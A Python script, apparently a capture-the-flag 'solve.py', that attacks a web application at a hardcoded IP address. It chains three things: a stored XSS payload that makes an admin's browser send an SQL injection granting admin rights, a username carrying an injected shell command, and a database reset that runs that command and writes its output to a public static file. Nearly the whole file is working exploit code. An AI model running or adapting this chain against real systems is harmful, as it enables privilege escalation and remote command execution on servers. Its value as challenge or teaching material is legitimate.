import sys
import requests
from bs4 import BeautifulSoup
import re
import time

password = "dummy"
email = "dummy@dummy.com"

xss_payload = """
<script>
fetch("/updatePassword", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "newPassword=dummy', admin=1 WHERE admin=0--"
});
</script>
"""

base_url = "http://34.44.129.8:56558"


def create_account(session, email, name, password):
    resp = session.post(f"{base_url}/signup", data={"email": email, "name": name, "password": password, "confirm": password})
    if resp.status_code == 200:
        print("Account created successfully.")
    else:
        print("Failed to create account.")

def login(session, name, password):
    resp = session.post(f"{base_url}/login", data={"name": name, "password": password})
    if resp.status_code == 200:
        print("Logged in successfully.")
    else:
        print("Failed to log in.")

def send_comment(session, comment):
    resp = session.post(f"{base_url}/contact", data={"comment": comment})
    if resp.status_code == 200:
        print("Comment sent successfully.")
    else:
        print("Failed to send comment.")

def reset_db(session):
    resp = session.post(f"{base_url}/resetDB")
    if resp.status_code == 200:
        print("Database reset successfully.")
    else:
        print("Failed to reset database.")

def get_output(session):
    resp = session.get(f"{base_url}/static/output.txt")
    if resp.status_code == 200:
        return resp.text
    return None

def main():
    if len(sys.argv) < 2:
        print("Usage: solve.py '<command>'")
        sys.exit(1)

    command = sys.argv[1]
    name = f"; echo $({command}) > static/output.txt ;#"

    session = requests.Session()
    
    create_account(session, email, name, password)
    login(session, name, password)
    send_comment(session, xss_payload)
    
    time.sleep(10) # wait for admin visit
    reset_db(session)
    
    output = get_output(session)

    if output:
        print("=== OUTPUT ===")
        print(output)
    else:
        print("[-] No output received within timeout.")

main()
